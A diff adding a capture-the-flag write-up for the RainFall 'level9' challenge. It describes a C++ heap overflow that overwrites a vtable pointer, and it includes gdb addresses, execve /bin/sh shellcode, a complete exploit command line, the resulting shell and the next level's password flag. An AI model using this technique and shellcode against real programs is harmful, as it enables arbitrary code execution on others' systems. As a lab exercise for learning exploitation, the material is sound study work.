@@ -1,0 +1,47 @@
+level9@RainFall:~$ ls -l
+total 8
+-rwsr-s---+ 1 bonus0 users 6720 Mar  6  2016 level9
+
+
+Program:
+    - uses 2 instances of a N class (eahc object allocate 108 oct on the heap)
+    - allocate argv[1] to N1.string
+    - call N2 operator+
+N:
+    - [0-3]: vpointer (pointeur to the vtable containing addresses of virtual methods)
+    - [4-107]: data buffer (string)
+    - setAnnotation: uses memcpy with length(argv[1])
+    
+Objective: use overflow of N1 memcpy to change vpointer of N2 to a fake vtable pointing to our shellcode
+So when N2 +operator is called, our shellcode is executed
+
+Addresses:
+    - N1:
+Breakpoint 1, 0x0804861c in main () (just after _Znwj@plt [constructor])
+(gdb) info registers eax
+eax            0x804a008	134520840
+    - N2:
+Breakpoint 2, 0x0804863e in main () (after N2 constructor)
+(gdb) info registers eax
+eax            0x804a078	134520952
+    - "Fake vtable" (beginning of our input):
+N1 + 4 = 0x804a00c
+    - Address of shellcode:
+Fake vtable + 4 = 0x804a010
+
+0x804a078 - 0x804a008 = 0x70 (112)
+--> Payload will have to be 108 char long (N1 string begins at N1 + 4)
+
+
+Shellcode execve(“\bin\sh\, [“/bin/sh”], NULL) :
+http://shell-storm.org/shellcode/files/shellcode-219.html
+\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80
+
+Payload: [address of shellcode][shellcode][108 - length(addr shell + shellcode) = 108 - (4 + 24) = 80][adress fake vtable]
+
+level9@RainFall:~$ ./level9 $(python -c 'print "\x10\xa0\x04\x08" + "\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80" + "A" * 80 + "\x0c\xa0\04\x08"')
+$ whoami
+bonus0
+$ cd ../bonus0
+$ cat .pass
+f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
